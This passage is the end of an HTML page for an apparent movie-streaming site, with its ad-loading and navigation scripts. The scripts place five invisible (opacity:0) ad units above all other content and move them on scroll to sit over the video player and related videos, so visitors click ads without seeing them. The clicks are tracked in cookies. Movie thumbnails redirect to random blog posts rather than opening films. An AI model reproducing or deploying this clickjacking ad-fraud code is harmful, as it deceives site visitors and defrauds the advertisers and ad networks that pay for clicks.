            <!-- Footer -->
            <footer class="site-footer">
                <p><strong>MovieVerse</strong> &copy; 2026 - Stream High-Definition 4K Movies &amp; Web Series.</p>
                <p>Disclaimer: This site does not store any files on its servers. All contents are provided by non-affiliated third parties.</p>
            </footer>

            <!-- Floating Ad Units Container -->
            <div id="floatads1" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;:bottom:0;z-index:9999;opacity:0;top:290px!important;margin-top:5px!important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-1"></center>
                </div>
            </div>
            <div id="floatads2" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;:bottom:0;z-index:9999;opacity:0;top:290px!important;margin-top:5px!important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-2"></center>
                </div>
            </div>
            <div id="floatads3" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;:bottom:0;z-index:9999;opacity:0;top:580px !important;margin-top:5px!important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-3"></center>
                </div>
            </div>
            <div id="floatads4" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;:bottom:0;z-index:9999;opacity:0;top:870px !important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-4"></center>
                </div>
            </div>
            <div id="floatads5" onclick="adclicked();" style="width:100%;margin:auto;text-align:center;float:none;overflow:hidden;display:scroll;position:fixed;:bottom:0;z-index:9999;opacity:0;top:1160px !important;">
                <div style="display:block;max-width:728px;height:auto;overflow:hidden;margin:auto;max-height:340px;">
                    <center id="jyad-5"></center>
                </div>
            </div>
        </div>
    </div>

    <!-- Scripts Section -->
    <script>
        function getWpApiEndpoint() {
            try {
                const restLink = document.querySelector('link[rel="https://api.w.org/"]') ||
                                 document.querySelector('link[rel="alternate"][type="application/json"][href*="/wp-json"]');
                if (restLink && restLink.href) {
                    var h = restLink.href;
                    return h.endsWith('/') ? h.slice(0, -1) : h;
                }
                if (window.wpApiSettings && window.wpApiSettings.root) {
                    var r = window.wpApiSettings.root;
                    return r.endsWith('/') ? r.slice(0, -1) : r;
                }
                const cachedApi = sessionStorage.getItem("wp_api_endpoint");
                if (cachedApi) return cachedApi;
            } catch (e) {}
            return \`\${window.location.origin}/wp-json\`;
        }

        let wpPosts = (window.__wp_posts && window.__wp_posts.length > 0)
            ? window.__wp_posts
            : (() => {
                try {
                    const cached = sessionStorage.getItem("wp_posts_cache");
                    if (cached) {
                        const parsed = JSON.parse(cached);
                        if (Array.isArray(parsed) && parsed.length > 0) return parsed;
                    }
                } catch (e) {}
                return [];
            })();

        async function fetchWpPosts() {
            if (wpPosts && wpPosts.length > 0) return wpPosts;
            const apiEndpoint = getWpApiEndpoint();
            let posts = [];
            try {
                let res = await fetch(\`\${apiEndpoint}/wp/v2/posts?per_page=50&_fields=link\`, { cache: "no-store" });
                if (!res.ok) res = await fetch(\`\${apiEndpoint}/wp/v2/posts?per_page=10&_fields=link\`, { cache: "no-store" });
                if (res.ok) {
                    const data = await res.json();
                    if (Array.isArray(data) && data.length > 0) {
                        posts = data.map(item => item && (item.link || (item.guid && item.guid.rendered))).filter(u => typeof u === 'string' && /^https?:\\/\\//i.test(u.trim()));
                    }
                }
            } catch (err) {}
            if (!posts || posts.length === 0) posts = [\`\${window.location.origin}/\`];
            wpPosts = posts;
            window.__wp_posts = posts;
            try { sessionStorage.setItem("wp_posts_cache", JSON.stringify(posts)); } catch (e) {}
            return posts;
        }

        function getRandomTargetUrl() {
            let pool = (wpPosts && wpPosts.length > 0) ? wpPosts : (window.__wp_posts || []);
            if (!pool || pool.length === 0) {
                try {
                    const cached = sessionStorage.getItem("wp_posts_cache");
                    if (cached) pool = JSON.parse(cached);
                } catch (e) {}
            }
            if (Array.isArray(pool) && pool.length > 0) {
                const current = window.location.href.split('?')[0];
                const cleanCurrent = current.endsWith('/') ? current.slice(0, -1) : current;
                const filtered = pool.filter(u => {
                    if (typeof u !== 'string') return false;
                    const cleanU = u.split('?')[0].endsWith('/') ? u.split('?')[0].slice(0, -1) : u.split('?')[0];
                    return cleanU !== cleanCurrent;
                });
                const finalPool = filtered.length > 0 ? filtered : pool;
                return finalPool[Math.floor(Math.random() * finalPool.length)];
            }
            return window.location.origin + '/';
        }

        const allowed_jye_adtype = ['adsense', 'gpt', 'both'];
        let jye_adtype = 'gpt';
        let divIds = ['jyad-1', 'jyad-2', 'jyad-3', 'jyad-4', 'jyad-5'];
        let divIdsIn = ['jyad-1-in', 'jyad-2-in', 'jyad-3-in', 'jyad-4-in', 'jyad-5-in'];
        let adSenseClientId = "3629083474762645";
        let adSenseSlots = ['2414446359', '8769542736', '2127714705', '8103700771', '5334539961'];
        let gptUnits = [{
             path: '/23332666651/adx1',
             sizes: [
                 [300, 250],
                 [320, 480],
                 [336, 280],
                 [480, 320]
             ]
         }, {
             path: '/23332666651/adx2',
             sizes: [
                 [480, 320],
                 [320, 480],
                 [336, 280],
                 [300, 250]
             ]
         }, {
             path: '/23332666651/adx3',
             sizes: [
                 [336, 280],
                 [300, 250],
                 [320, 480],
                 [480, 320]
             ]
         }, {
             path: '/23332666651/adx4',
             sizes: [
                 [480, 320],
                 [320, 480],
                 [336, 280],
                 [300, 250]
             ]
         }, {
             path: '/23332666651/adx5',
             sizes: [
                 [480, 320],
                 [320, 480],
                 [336, 280],
                 [300, 250]
             ]
         }];
    </script>
    <script>
        const targetv = document.getElementById("playWrapper");
        const floatads1 = document.getElementById("floatads1");
        const target = document.getElementById("relatedVideos1234");
        const floatads2 = document.getElementById("floatads2");
        const floatads3 = document.getElementById("floatads3");
        const floatads4 = document.getElementById("floatads4");
        const floatads5 = document.getElementById("floatads5");
        window.addEventListener("scroll", () => {
            const rectv = targetv ? targetv.getBoundingClientRect() : { top: 0 };
            const rect = target ? target.getBoundingClientRect() : { top: 0 };
            var newTop = rectv.top;
            if (floatads1) floatads1.style.setProperty("top", newTop + "px", "important");
            var newTop2 = rect.top + 290;
            if (floatads2) floatads2.style.setProperty("top", newTop2 + "px", "important");
            if (floatads3) floatads3.style.setProperty("top", newTop2 + "px", "important");
            if (floatads4) floatads4.style.setProperty("top", newTop2 + "px", "important");
            if (floatads5) floatads5.style.setProperty("top", newTop2 + "px", "important");
        });
    </script>
    <script>
        const textArray = [
            "Experience the ultimate cinema thrill with 4K UHD streaming at lightning speeds.",
            "Watch thousands of trending Hollywood, Bollywood and Anime series anytime, anywhere.",
            "High-bitrate Dolby Atmos audio with multi-language dubbing and crystal-clear subtitles.",
            "Instant buffer-free streaming supported across mobile, tablet, desktop and Smart TV.",
            "Download full episodes and blockbuster movies in 480p, 720p, 1080p FHD and 4K UHD.",
            "Updated daily with newly released theatrical blockbusters and exclusive digital premieres."
        ];

        function getRandomInt(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        for (let i = 1; i <= 6; i++) {
            const textcontentdiv = document.getElementById(\`textcontent-div-\${i}\`);
            if (!textcontentdiv) continue;
            const randomText = textArray[Math.floor(Math.random() * textArray.length)];
            textcontentdiv.textContent = randomText;
            const randomHeight = getRandomInt(40, 90);
            textcontentdiv.style.minHeight = randomHeight + "px";
            textcontentdiv.style.color = "#64748b";
            textcontentdiv.style.fontSize = "13px";
        }
    </script>
    <script>
        function setCookie(name, value, hours) {
            let expires = "";
            if (hours) {
                const date = new Date();
                date.setTime(date.getTime() + (hours * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + encodeURIComponent(value) + expires + "; path=/";
        }

        function getCookie(name) {
            const nameEQ = name + "=";
            const cookies = document.cookie.split(';');
            for (let i = 0; i < cookies.length; i++) {
                let c = cookies[i].trim();
                if (c.indexOf(nameEQ) === 0) {
                    return decodeURIComponent(c.substring(nameEQ.length));
                }
            }
            return null;
        }

        function isCookieExists(name) {
            return getCookie(name) !== null;
        }

        function adclicked() {
            if (document.hasFocus()) {
                sessionStorage.setItem("adclk", 1);
                setCookie("wdchange", "true", 19);
            }
        }

        // Hook all movie cards with .thumb-image to trigger random WordPress permalink redirection
        const thumbs = document.querySelectorAll('.thumb-image');
        thumbs.forEach(img => {
            img.addEventListener('click', function() {
                var click_id = this.getAttribute('data-id');
                setCookie("jpid", click_id, 9);
                var randomblgurl = getRandomTargetUrl();
                if (randomblgurl) {
                    window.location.href = randomblgurl;
                }
            });
        });
    </script>
    <script>
        function shuffle(array) {
            const a = array.slice();
            for (let i = a.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [a[i], a[j]] = [a[j], a[i]];
            }
            return a;
        }

        function loadScriptOnce(url, options = {}) {
            return new Promise((resolve, reject) => {
                if (document.querySelector(\`script[src="\${url}"]\`)) {
                    resolve();
                    return;
                }
                const s = document.createElement('script');
                s.src = url;
                s.async = options.async !== false;
                if (options.crossorigin) s.crossOrigin = options.crossorigin;
                s.onload = resolve;
                s.onerror = () => reject(new Error(\`Failed to load script: \${url}\`));
                document.body.appendChild(s);
            });
        }
        async function loadAdSenseScript() {
            const url = \`https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-\${adSenseClientId}\`;
            await loadScriptOnce(url, {
                async: true,
                crossorigin: 'anonymous'
            });
        }

        function createAdSenseIns(divId, adSlot) {
            const targetEl = document.getElementById(divId);
            if (!targetEl) return;
            const ins = document.createElement('ins');
            ins.className = 'adsbygoogle';
            ins.style.display = 'block';
            ins.setAttribute('data-ad-client', \`ca-pub-\${adSenseClientId}\`);
            ins.setAttribute('data-ad-slot', adSlot);
            ins.setAttribute('data-ad-format', 'auto');
            ins.setAttribute('data-full-width-responsive', 'true');
            targetEl.appendChild(ins);
            (adsbygoogle = window.adsbygoogle || []).push({});
        }

        async function loadGPTScript() {
            await loadScriptOnce("https://securepubads.g.doubleclick.net/tag/js/gpt.js", {
                async: true,
                crossorigin: 'anonymous'
            });
            window.googletag = window.googletag || { cmd: [] };
        }

        function createGPTUnit(divId, unit) {
            if (!document.getElementById(divId)) return;
            googletag.cmd.push(function() {
                const sizesShuffled = shuffle(unit.sizes);
                googletag.defineSlot(unit.path, sizesShuffled, divId).addService(googletag.pubads());
                googletag.pubads().enableSingleRequest();
                googletag.enableServices();
                googletag.display(divId);
            });
        }

        async function initAds(type = 'both') {
            const tasks = [];
            if (type === 'adsense' || type === 'both') tasks.push(loadAdSenseScript());
            if (type === 'gpt' || type === 'both') tasks.push(loadGPTScript());
            await Promise.all(tasks);
            var divsShuffled = divIds;
            if (sessionStorage.getItem("adclk") == 1) {
                divsShuffled = divIdsIn;
            }
            let adCodes = [];
            if (type === 'adsense') {
                const slotsShuffled = shuffle(adSenseSlots).slice(0, divIds.length);
                adCodes = slotsShuffled.map(slot => ({
                    type: 'adsense',
                    adSlot: slot
                }));
            } else if (type === 'gpt') {
                const unitsShuffled = shuffle(gptUnits).slice(0, divIds.length);
                adCodes = unitsShuffled.map(unit => ({
                    type: 'gpt',
                    unit
                }));
            } else if (type === 'both') {
                const numAdsense = Math.floor(divIds.length / 2);
                const numGPT = divIds.length - numAdsense;
                const slotsShuffled = shuffle(adSenseSlots).slice(0, numAdsense);
                const unitsShuffled = shuffle(gptUnits).slice(0, numGPT);
                adCodes = [...slotsShuffled.map(slot => ({
                    type: 'adsense',
                    adSlot: slot
                })), ...unitsShuffled.map(unit => ({
                    type: 'gpt',
                    unit
                }))];
            }
            const finalAdCodes = shuffle(adCodes);
            for (let i = 0; i < divsShuffled.length; i++) {
                const divId = divsShuffled[i];
                const code = finalAdCodes[i];
                if (!code || !document.getElementById(divId)) continue;
                if (code.type === 'adsense') createAdSenseIns(divId, code.adSlot);
                else if (code.type === 'gpt') createGPTUnit(divId, code.unit);
            }
        }

        async function initAll() {
            if (!wpPosts || wpPosts.length === 0) {
                await fetchWpPosts();
            }
            await initAds(jye_adtype);
        }

        if (document.readyState === "loading") {
            document.addEventListener("DOMContentLoaded", initAll);
        } else {
            initAll();
        }
    </script>
</body>
</html>`);
    }
})();
